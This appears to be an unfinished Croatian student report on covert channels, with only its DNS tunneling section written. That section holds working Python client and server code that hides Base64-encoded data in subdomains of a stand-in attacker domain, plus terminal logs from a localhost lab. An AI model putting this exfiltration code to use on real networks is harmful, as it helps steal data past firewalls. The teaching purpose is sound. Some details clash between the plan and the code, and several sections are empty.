# 1. Uvod









# 2. DNS Tunneling - Donat Ricov

Domain Name System protokol, poznat i kao DNS protokol, obuhvaća tehniku za prijenos podataka koji protokolu nisu izvorno namjenjeni. Iako je DNS koristan za prevođenje naziva domena u IP adrese te je kao takav osnovni protokol intereta, ovakva priroda samog protokola čine ga idealnim medijem za zaobilaženje standardnih sigurnosnih politika i stvaranje skirvenih komunikacijskih kanala. To znači da osim što DNS zbog svoje široke primjene može biti korišten u legitimate svrhe, također može biti zlouporabljen u kontekstu kibernetičkih napada kako bi se izvršila neželjena eksfiltracija podataka.

Tipičan primjer zlouporabe DNS protokola obuhvaća scenarij u kojem napadač enkapsulira podatke unutar DNS upita i njegovog odgovora. Ovi podaci mogu obihvaćati bezazlen internet promet i standardne komande, ali može se raditi o povjerljivim sigurnosim podacima. Budući da većina mreža dopušta DNS promet zbog njegove prethodno spomenute široke uporabe, potencijalna zlouporaba često može proći nefiltrirana u odnosu na druge vrste prometa. Potencijalno opasan mrežni promet tako često može zaobići vatrozide i probijati sigurnosne sustave u potpunosti neopaženo. Rezultat ovog je stvoren tunel između kompromitiranog sustava i udaljenog poslužitelja napadača.

Mehanizam rada DNS tunnelinga obično uključuje nekoliko komponenti:

1. Klijent na kompromitiranom uređaju - dio malicioznog softvera koji kodira podatke u oblik prikladan za DNS upite.

2. DNS poslužitelj kontroliran od napadača - konfiguriran za obradu neuobičajenih DNS upita i dekodiranje sadržaja unutar njih.

3. Tunneling protokol - definira način pretvaranja podataka u DNS pakete te njihovu rekonstrukciju na odredištu.

Ovakva struktura, zajedno sa standardizacijom samog DNS-a, su razlog njegove učinkovitosti. DNS nazivi domena imaju definiranu strukturu prema kojoj isti mogu sadržavati samo relativno duge nizove znakova. Ovakva struktura omogućava napadaču prenošenje osjetljivih kodiranih podataka. Ovako DNS upiti prolaze kroz nekoliko poslužitelja što otežava, ili čak onemogućuje, lociranje stvarnog izvora tunnelinga.

<img width="6056" height="2050" alt="image" src="https://github.com/user-attachments/assets/29ece733-e97f-48fa-b4b3-a22080c25a47" />

<p align="center"><em>Slika 1: Primjer DNS tunnelinga</em></p>

Iako je tehnika široko poznada u području mrežne i kibernetičke sigurnosti kao medij zlouporabe informacija, krađu podataka i održavanje zlonamjernih kanala, DNS tunneling ima raširene legitimne primjene. Pojedini administratori su korisnici ove tehnike jer im dopušta omogućavanje ograničenih mrežnih usluga u ograničenim ili čak zatvorenim okruženjima. Ipak, i u ovakvim okruženjima primjena ovakvog pristupa može sa sobom nositi legitiman rizik koji može komprimirati sigurnosne politike mreže.

Uzevši u obzir eklatantan porast uporabe DNS tunnelinga u malicioznim svrhama, moderni sigurnosni sustavi često provide napredne analize DNS prometa, dok mrežni administratori pomno prate potencijalne anomalije u strukturi samog prometa. 

# 2.1. Plan izrade praktičnog dijela

Praktični dio rada temelji se na izgradnji i simulaciji okruženja u kojem se demonstrira način funkcioniranja DNS tunnelinga. U ovoj fazi simulirano je generiranje, prijenos i presretanje samih podataka koji su skriveni unutar legitimnog DNS promjeta. Na ovaj je način demonstrirano kako se u praksi može izgraditi ovakav tunel kojim se prenose podaci putem standardnih DNS mehanizama. Također, evidentirano je kako ovakva vrsta prometa izgleda kada je promatrana kroz alate za analizu mreže. Ovakva vrsta pristupa pruža jasnu ilustraciju koncepta DNS tunnelinga kao i praktični prikaz realnog scenarija napada. Ovo je ključno za razumjevanje tehničke izvedbe napada i njegovog potencijalnog sigurnosnog značaja za sami sustav.

## 2.2. Metode i tehnike rada

Za postavljanje izoliranog laboratorijskog okruženja koristi se Oracle VirtualBox, koji omogućuje stvaranje virtu­alnih strojeva i simuliranje različitih uloga u napadu - klijenta, napadača i DNS poslužitelja. Operacijski sustav korišten u virtualnim strojevima je Ubuntu/Linux Mint 22, zbog stabilnosti, jednostavnosti konfiguracije mrežnih servisa i dostupnosti potrebnih alata.

Za nadzor i analizu mrežnog prometa koriste se alati:

- Wireshark - za detaljnu grafičku analizu paketa, dekodiranje DNS upita i odgovora te praćenje anomalija u prometu.

- tcpdump - za tekstualno praćenje prometa u stvarnom vremenu, posebno korisno za verifikaciju da se tunelirani sadržaj doista pojavljuje unutar DNS paketa.

U eksperimentalnoj konfiguraciji lokalna fizička računala služe kao tunnel endpoint, odnosno krajnja točka napadačkog kanala. Uz to se simulira rad lokalnog DNS poslužitelja čija je adresa namjerno postavljena na 127.0.0.1, kako bi sav DNS promet bio preusmjeren na Python skriptu koja oponaša ponašanje DNS servera. Time se osigurava potpuno kontrolirano okruženje za testiranje bez rizika utjecaja na stvarnu mrežnu infrastrukturu.

Klijentski program i simulirani DNS poslužitelj implementirani su u programskom jeziku Python, što omogućuje potpunu fleksibilnost u manipuliranju DNS zaglavljima i generiranju vlastitih DNS paketa. Ovaj pristup omogućuje jasno prikazivanje osnovne ideje tuneliranja - enkapsuliranja proizvoljnih podataka u DNS upit i njihovo naknadno izvlačenje na strani poslužitelja.

Logika simuliranog napada uključuje nekoliko ključnih koraka:

1. Postavljanje lokalne domene - za potrebe eksperimenta definira se testna domena “eksfiltracija.hr”, koja predstavlja napadačevu domenu nad kojom DNS poslužitelj ima potpunu kontrolu.

2. Simulacija DNS poslužitelja - Python skripta sluša dolazne DNS upite na lokalnoj adresi i dekodira skrivene podatke unutar naziva domene.

3. Konfiguracija klijenta - klijentski program kodira tajnu poruku (npr. tekst ili manju datoteku) u oblik pogodan za umetanje u DNS upite, obično uz korištenje base32 ili sličnih tehnika.

4. Slanje tuneliranog prometa - poruka se šalje segmentirana i umetnuta u niz DNS upita prema napadačevoj domeni, čime se simulira proces eksfiltracije podataka.

5. Nadzor prometa alatima tcpdump i Wireshark - prisluškuje se mrežni promet kako bi se potvrdila prisutnost neobičnih, produljenih ili kodiranih DNS zahtjeva, što je karakteristično za DNS tunneling.

6. Obrada i rekonstrukcija podataka na strani poslužitelja - kada simulirani DNS server primi upit, on detektira i dekodira skrivene informacije te rekonstruira originalnu tajnu poruku.

## 2.3. Praktični dio

U sklopu praktičnog dijela rada implementiran je jednostavan DNS poslužitelj u programskom jeziku Python koji služi za demonstraciju DNS tunnelinga. Poslužitelj obrađuje dolazne DNS zahtjeve, iz imena domene izdvaja skrivenu poruku kodiranu u Base64 formatu te je dekodira na strani napadača. Time se ilustrira kako je moguće prenijeti proizvoljne podatke unutar DNS prometa.

### 2.3.1. Poslužitelj - dns_server.py

Na početku skripte uvoze se potrebni moduli:

import socket
import base64
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A


Modul socket služi za rad s UDP socketima i primanje/slanje DNS paketa, base64 omogućuje dekodiranje poruka koje su skrivene u DNS upitima, dok se pomoću biblioteke dnslib pojednostavljuje parsiranje i generiranje DNS zapisa (upita i odgovora).

Ekstrakcija skrivene poruke iz poddomene

Funkcija extract_message_from_subdomain(subdomain) zadužena je za dekodiranje skrivene poruke:

def extract_message_from_subdomain(subdomain):
    try:
        return base64.urlsafe_b64decode(subdomain.encode()).decode()
    except Exception as error:
        return f"Error decoding message: {error}"


Pretpostavlja se da je tajna poruka kodirana u Base64 formatu i umetnuta u prvi dio domene (poddomenu). Funkcija prima taj niz znakova, pretvara ga u bajtove i potom pokušava dekodirati iz Base64 natrag u čitljiv tekst. U slučaju pogreške (npr. ako niz nije ispravno kodiran), vraća se poruka o grešci. Ovaj korak direktno predstavlja “vađenje” tuneliranih podataka iz DNS upita.

Obrada DNS upita i dekodiranje tajne

Ključna logika implementirana je u funkciji process_dns_query(query_data, client_ip):

def process_dns_query(query_data, client_ip):
    parsed_query = DNSRecord.parse(query_data)
    response_record = DNSRecord(
        DNSHeader(id=parsed_query.header.id, qr=1, aa=1, ra=1),
        q=parsed_query.q
    )
    requested_domain = str(parsed_query.q.qname)
    print(f"Received DNS request for: {requested_domain} from {client_ip}")


Primljeni DNS paket se parsira pomoću DNSRecord.parse, čime se dobiva struktura koja olakšava dohvaćanje traženog imena domene (qname). Na temelju dobivenog upita kreira se početni DNS odgovor (response_record), pri čemu se zadržava isti identifikator (id) kako bi klijent prepoznao odgovor kao pripadajući odgovarajućem upitu.

Sljedeći dio funkcije provjerava radi li se o domeni koja se koristi za tuneliranje:

    if "dataexfiltration.hr" in requested_domain:
        domain_parts = requested_domain.split('.')
        if len(domain_parts) > 2:
            secret_part = domain_parts[0]
            decoded_message = extract_message_from_subdomain(secret_part)
            print(f"Decoded secret: {decoded_message}")
        
        ip_address = "127.0.0.1"
        response_record.add_answer(RR(requested_domain, QTYPE.A, rdata=A(ip_address), ttl=300))
        print(f"Responding with IP: {ip_address}")
    else:
        print(f"Invalid domain query for: {requested_domain}")

    return response_record.pack()


Domena „dataexfiltration.hr“ predstavlja napadačevu domenu namijenjenu eksfiltraciji podataka. Ako se u zahtjevu nalazi ta domena, skripta razbija ime domene na dijelove pomoću točke (split('.')). U slučaju da postoji više od dva dijela (npr. tajnaPoruka.dataexfiltration.hr), pretpostavlja se da je prvi dio (secret_part) Base64-kodirana tajna poruka. Ta se poddomena potom prosljeđuje funkciji extract_message_from_subdomain, a dekodirana poruka ispisuje se u konzolu. Time napadačev poslužitelj “čita” tunelirane podatke skrivenе u DNS imenu.

Neovisno o sadržaju poruke, DNS poslužitelj vraća legitiman odgovor klijentu: dodaje A zapis koji traženu domenu mapira na IP adresu 127.0.0.1. Na taj način DNS odgovor izgleda uobičajeno, a tuneliranje ostaje skriveno unutar same strukture upita.

Ako zahtjev nije usmjeren na domenu dataexfiltration.hr, poslužitelj ga označava kao nevažeći za potrebe tuneliranja, ali ga i dalje može obraditi ili ignorirati, ovisno o daljnjoj implementaciji.

Pokretanje DNS poslužitelja

Funkcija run_dns_server implementira samu DNS uslugu koja neprekidno sluša na odabranom portu:

def run_dns_server(bind_address="0.0.0.0", bind_port=5354):
    print(f"DNS server is running on {bind_address}:{bind_port}")
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as server_socket:
        server_socket.bind((bind_address, bind_port))
        while True:
            try:
                query_data, client_address = server_socket.recvfrom(512)
                response_data = process_dns_query(query_data, client_address)
                server_socket.sendto(response_data, client_address)
            except Exception as e:
                print(f"Error during query processing: {e}")


Poslužitelj koristi UDP socket jer DNS standardno radi preko UDP-a. Socket se veže na zadanu IP adresu i port (u ovom slučaju 5354), zatim u beskonačnoj petlji (while True) prima DNS upite do veličine 512 bajtova (standardna veličina DNS paketa). Svaki primljeni upit prosljeđuje se funkciji process_dns_query, a dobiveni odgovor ponovno se šalje klijentu na istu adresu. Ugrađena je osnovna obrada grešaka kako bi se spriječio prestanak rada poslužitelja zbog iznimki.

Na kraju se skripta pokreće standardnim Python obrascem:

if __name__ == "__main__":
    try:
        run_dns_server()
    except KeyboardInterrupt:
        print("\nDNS server stopped.")


Ovo omogućuje da se DNS poslužitelj pokrene samo kada se skripta izvršava izravno, dok se logika može ponovno koristiti i kao modul u drugim programima.

## 2.3.2. Klijent - client.py

import dns.message
import dns.query
import base64

def encode_data_in_subdomain(data, domain):
    encoded = base64.urlsafe_b64encode(data.encode()).decode()
    return f"{encoded}.{domain}"

def transmit_dns_tunnel_message(server, domain, message, port=53):
    query_domain = encode_data_in_subdomain(message, domain)
    query = dns.message.make_query(query_domain, dns.rdatatype.A)
    try:
        response = dns.query.udp(query, server, port=port)
        print(f"Message sent: '{message}' as '{query_domain}'")
        print(f"Response:\n{response}")
    except Exception as e:
        print(f"Transmission failed: {e}")

if __name__ == "__main__":
    domain = "dataexfiltration.hr"
    server_ip = "127.0.0.1"
    server_port = 5354

    msg = "Ova poruka je tajna."

    transmit_dns_tunnel_message(server_ip, domain, msg, port=server_port)

## 2.4. Slanje poruke i snimanje prometa

### 2.4.1. tcmdump

Snimio sam pakete koji idu na portu 5354.

sudo tcpdump -i lo udp port 5354 -w dns_tunnel.pcap

Objasnjenje

### 2.4.2. Pokretanje DNS servera

Otvorio sam drugi terminal i u njemu pokrenuo

cd dns_tunnel
python3 dns_server.py

I dobio poruku:

Starting DNS server on 0.0.0.0:5354

### 2.4.3. Pokretanje klijenta i slanje poruke

Otvorio sam treći terminal i pokrenuo:

cd dns_tunnel
python3 client.py

Što je ispisalo:

donat@donat-VirtualBox:~$ cd dns_tunnel
python3 client.py
Message sent: 'Ova poruka je tajna.' as 'T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr'
Response:
id 64216
opcode QUERY
rcode NOERROR
flags QR AA RD RA
;QUESTION
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. IN A
;ANSWER
T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. 300 IN A 127.0.0.1
;AUTHORITY
;ADDITIONAL

### 2.4.3. Čitanje tajne poruke

donat@donat-VirtualBox:~/dns_tunnel$ python3 dns_server.py
DNS server is running on 0.0.0.0:5354
Received DNS request for: T3ZhIHBvcnVrYSBqZSB0YWpuYS4=.dataexfiltration.hr. from ('127.0.0.1', 41631)
Decoded secret: Ova poruka je tajna.
Responding with IP: 127.0.0.1

### 2.4.4. Zaustavljanje tcpdump-a

Kada sam zaustavio tcpdump dobio sam 

^C2 packets captured
4 packets received by filter
0 packets dropped by kernel
donat@donat-VirtualBox:~$ ^C

Te sam dobio datoteku dns_tunnel.pcap.

### 2.5. Analiza prometa u Wiresharku









































# 3. Steganografija - Lana Maček

# 4. Covert timing channels - Marin Vabec

# 5. SMTP - Dino Primorac
